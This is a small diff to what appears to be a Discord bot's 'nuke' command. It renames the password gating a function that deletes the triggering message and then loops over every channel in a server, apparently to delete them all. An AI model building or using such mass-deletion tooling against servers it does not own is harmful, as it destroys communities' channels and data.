@@ -9,7 +9,7 @@ from config import config
 client = commands.Bot(command_prefix='')
 
 async def deletechannels(ctx, password):
-    if password == config.NoChannelsPassword:
+    if password == config.NukePass:
         await ctx.message.delete()
         for channel in list(ctx.message.guild.channels):
             try:
